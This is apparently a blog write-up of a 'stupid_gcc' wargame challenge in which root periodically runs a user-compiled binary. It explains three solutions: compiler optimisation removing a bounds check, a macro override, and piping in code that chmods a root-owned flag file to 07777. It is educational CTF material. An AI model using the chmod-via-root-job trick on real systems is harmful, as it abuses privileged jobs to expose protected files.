---
title: "stupid_gcc"
description: ""
date: 2024-07-02
draft: false
starred: false
tags: ["wargame"]
comments: false
---

![스크린샷 2024-07-02 210414.png](/assets/content/blog/stupid_gcc/screenshot_2024-07-02_210414.png)

```
root 사용자가 10초에 한번씩 /home/stupid_gcc/a.out을 실행합니다 ! 
```

컴파일로도 코드 작동이 달라질 수 있다니…

There’s various ways of solving this problem.

```bash
# no.1
gcc -O2 a.c
gcc -O3 a.c
 
# no.2
echo -e '
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>

int main()
{
    chmod("/flag.txt", 07777);
}' |  gcc -o a.out -x c -

# no.3
gcc -D"if(x)=if(1)" a.c
```

no.2, no.3 is straight forward. 

- no.2 uses passes new code as a input to the gcc straight from the CLI.

```bash
localhost:~$ ls -l
total 24
-r-xr-xr-x    1 root     root           617 Jan  2  2023 a.c
-rwxr-xr-x    1 anonymou stupid_g     18312 Jul  2 12:22 a.out
```

- no.3 uses macro by using `-D` and replaces all `if()`  statements to `if(1)`.

But no.1 ?? 

### The given source code

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
    uint8_t v1 = 0;
    int v2 = 0;
    char v3[31];
    uint16_t v4[10]={0,};

    while (v4[v1] < UINT16_MAX && v1 < 10) {
        v1++;
        printf("v4[%d]: %p\n", v1, &v4[v1]);
        v2 += v1;

        if (v2 > 10000) {
            FILE *fp = fopen("/flag.txt", "r");
            fgets(v3, 31, fp);
            fclose(fp);

            fp = fopen("/home/stupid_gcc/flag.txt", "w");
            fwrite(v3, 31, 1, fp);
            fclose(fp);
            return 0;
        }
    }
    return 0;
}
```

## no.1

```bash
localhost:~$ gcc -O3 a.c
localhost:~$ ./a.out
v4[1]: 0x7ffe778547b2
v4[2]: 0x7ffe778547b4
v4[3]: 0x7ffe778547b6
v4[4]: 0x7ffe778547b8
...
v4[140]: 0x7ffe778548c8
v4[141]: 0x7ffe778548ca

localhost:~$ cat ~/flag.txt
DH{wow...}
```

1 + 2 + … + 141 == 10011

`-O` (capital o) is about compiler's *optimization* level.

![https://www.rapidtables.com/code/linux/gcc/gcc-o.html](/assets/content/blog/stupid_gcc/screenshot_2024-07-02_215505.png)

https://www.rapidtables.com/code/linux/gcc/gcc-o.html

Optimization can change how the code is compiled.

### `o3.out` (optimized)

```c
   0x000000000000116b <+107>:   cmp    WORD PTR [r12+rbx*2-0x2],0xffff
   0x0000000000001172 <+114>:   jne    0x1148 <main+72>
```

### `a.out` (not optimized)

```c
   0x00000000000012fe <+277>:   movzx  eax,BYTE PTR [rbp-0x5d]
   0x0000000000001302 <+281>:   cdqe
   0x0000000000001304 <+283>:   movzx  eax,WORD PTR [rbp+rax*2-0x50]
   0x0000000000001309 <+288>:   cmp    ax,0xffff
   0x000000000000130d <+292>:   je     0x1319 <main+304>
   0x000000000000130f <+294>:   cmp    BYTE PTR [rbp-0x5d],0x9
   0x0000000000001313 <+298>:   jbe    0x122b <main+66>
```

The asm snippets above are where the `while (v4[v1] < UINT16_MAX && v1 < 10)` is checked.

As you can see, optimized version just checks if the `r12+rbx*2-0x2` is the same or not and goes into the loop if it’s not. There’s no further check on `v1 < 10`. 

Hence while loop keeps running even after 10th iteration.

(Guessing the reason why `v1 < 10` is not checked is because the GCC “thinks” that condition can be True only when the `v4[v1] < UINT16_MAX` is True since it’s difficult to be achieved.)

Too much optimization is not good!

![Untitled](/assets/content/blog/stupid_gcc/Untitled.gif)

🚩
